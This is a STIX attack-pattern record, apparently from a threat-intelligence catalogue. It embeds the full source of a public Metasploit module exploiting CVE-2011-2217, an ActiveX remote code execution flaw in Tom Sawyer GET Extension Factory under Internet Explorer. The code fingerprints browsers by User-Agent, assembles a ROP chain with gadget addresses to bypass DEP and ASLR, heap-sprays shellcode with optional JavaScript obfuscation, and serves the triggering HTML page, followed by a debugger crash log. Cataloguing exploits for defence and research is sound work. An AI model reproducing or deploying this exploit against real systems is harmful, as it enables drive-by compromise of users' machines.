{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6f6a034c-ea29-4740-ba57-1850186b203f",
    "created": "2024-08-14T16:44:48.439434Z",
    "modified": "2024-08-14T16:44:48.439438Z",
    "name": "\"Tom Sawyer Software GET Extension Factory Remote Code Execution\"",
    "description": " This module exploits a remote code execution vulnerability in the tsgetx71ex553.dll ActiveX control installed with Tom Sawyer GET Extension Factory due to an incorrect initialization under Internet Explorer.  While the Tom Sawyer GET Extension Factory is installed with some versions of VMware Infrastructure Client, this module has been tested only with the versions installed with Embarcadero Technologies ER/Studio XE2 / Embarcadero Studio Portal 1.6. The ActiveX control tested is tsgetx71ex553.dll, version 5.5.3.238.  This module achieves DEP and ASLR bypass using the well known msvcr71.dll rop chain. The dll is installed by default with the Embarcadero software, and loaded by the targeted ActiveX.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/tom_sawyer_tsgetx71ex552.rb",
            "external_id": "tom_sawyer_tsgetx71ex552.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2217"
        },
        {
            "source_name": "reference",
            "url": "http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=911"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"8.0\",\n  #  :javascript => true,\n  #  :rank       => NormalRanking,\n  #  :classid    => \"{658ED6E7-0DA1-4ADD-B2FB-095F08091118}\"\n  #})\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Tom Sawyer Software GET Extension Factory Remote Code Execution\",\n      'Description'    => %q{\n          This module exploits a remote code execution vulnerability in the tsgetx71ex553.dll\n        ActiveX control installed with Tom Sawyer GET Extension Factory due to an incorrect\n        initialization under Internet Explorer.\n\n        While the Tom Sawyer GET Extension Factory is installed with some versions of VMware\n        Infrastructure Client, this module has been tested only with the versions installed\n        with Embarcadero Technologies ER/Studio XE2 / Embarcadero Studio Portal 1.6. The ActiveX\n        control tested is tsgetx71ex553.dll, version 5.5.3.238.\n\n        This module achieves DEP and ASLR bypass using the well known msvcr71.dll rop chain. The\n        dll is installed by default with the Embarcadero software, and loaded by the targeted\n        ActiveX.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Elazar Broad', # Vulnerability discovery\n          'rgod', # PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-2217' ],\n          [ 'OSVDB', '73211' ],\n          [ 'BID', '48099' ],\n          [ 'URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=911' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'           => 1024,\n          'BadChars'        => \"\\x00\",\n          'DisableNops'     => true\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Embarcadero Technologies ER/Studio XE2\n          # tsgetx71ex553.dll 5.5.3.238\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3',\n            {\n              'Rop'    => nil,\n              'Offset' => '0x00'\n            }\n          ],\n          [ 'IE 7 on Windows XP SP3',\n            {\n              'Rop'    => nil,\n              'Offset' => '0x800 - code.length'\n            }\n          ],\n          [ 'IE 8 on Windows XP SP3',\n            {\n              'Rop'    => true,\n              'Offset' => '0x0',\n              'RopChainOffset' => '0x73e'\n            }\n          ],\n          [ 'IE 8 on Windows 7 SP1',\n            {\n              'Rop'    => true,\n              'Offset' => '0x0',\n              'RopChainOffset' => '0x73e'\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-05-03',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])\n      ])\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8/\n      return targets[3]  #IE 8 on Windows XP SP3\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 8/\n      return targets[4]  #IE 8 on Windows 7 SP1\n    else\n      return nil\n    end\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\").first\n  end\n\n  def nop\n    return make_nops(4).unpack(\"V\").first\n  end\n\n  def get_rop_chain(t)\n\n    adjust =\n    [\n      junk,  # heap sprayed to 342d1ea0\n      0x7c1ce310,  # stackpivot # push ecx # pop esp # pop edi # pop esi # retn 18 # mfc71.DLL\n      0x7c347f98,  # RETN (ROP NOP) # msvcr71.dll\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk\n    ].pack(\"V*\")\n\n    # chain generated by mona.py - See corelan.be\n    rop =\n    [\n      0x7c37653d,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN\n      0xfffffdff,  # Value to negate, will become 0x00000201 (dwSize)\n      0x7c347f98,  # RETN (ROP NOP)\n      0x7c3415a2,  # JMP [EAX]\n      0xffffffff,\n      0x7c376402,  # skip 4 bytes\n      0x7c351e05,  # NEG EAX # RETN\n      0x7c345255,  # INC EBX # FPATAN # RETN\n      0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN\n      0x7c344f87,  # POP EDX # RETN\n      0xffffffc0,  # Value to negate, will become 0x00000040\n      0x7c351eb1,  # NEG EDX # RETN\n      0x7c34d201,  # POP ECX # RETN\n      0x7c38b001,  # &Writable location\n      0x7c347f97,  # POP EAX # RETN\n      0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]\n      0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN\n      0x7c345c30,  # ptr to 'push esp #  ret '\n    ].pack(\"V*\")\n\n    code = adjust\n    code << rop\n\n    return code\n  end\n\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Target set: #{my_target.name}\")\n\n    p = payload.encoded\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(my_target.arch))\n    js_90_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n    randnop2 = rand_text_alpha(rand(100) + 1)\n\n    if my_target['Rop'].nil?\n      js_shellcode = \"var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\"\n    else\n      js_rop = Rex::Text.to_unescape(get_rop_chain(my_target), Rex::Arch.endian(my_target.arch))\n      js_shellcode = <<-JS_ROP\n      var rop_chain = unescape(\"#{js_rop}\");\n      var nops_padding = nops.substring(0, 0x73e-code.length-offset.length);\n      var shellcode = code + nops_padding + rop_chain + nops_90.substring(0, 0x800-code.length-nops_padding.length-rop_chain.length);\n      JS_ROP\n      js_shellcode = js_shellcode.gsub(/^ {6}/, '')\n    end\n\n    js = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n    var #{randnop2} = \"#{js_90_nops}\";\n    var nops_90 = unescape(#{randnop2});\n\n    while (nops.length < 0x80000) nops += nops;\n    while (nops_90.length < 0x80000) nops_90 += nops_90;\n\n    var offset = nops.substring(0, #{my_target['Offset']});\n    #{js_shellcode}\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n\n    heap_obj.gc();\n    for (var z=1; z < 0x685; z++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    js = heaplib(js, {:noobfu => true})\n\n    #obfuscate on demand\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    html = <<-EOS\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object classid=\"clsid:658ED6E7-0DA1-4ADD-B2FB-095F08091118\">\n    </object>\n    </body>\n    </html>\n    EOS\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n\n  end\nend\n\n=begin\n(b44.b48): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=0013e27c ecx=342d1ea0 edx=00000000 esi=75c63d38 edi=80004002\neip=28d2954d esp=0013e230 ebp=0013e2d4 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010216\ntsgetx71ex553!Ordinal931+0x2dd:\n28d2954d ff5104          call    dword ptr [ecx+4]    ds:0023:342d1ea4=????????\n=end\n",
    "x_mitre_disclosure_date": "2011-05-03",
    "x_mitre_platforms": [
        "win'"
    ]
}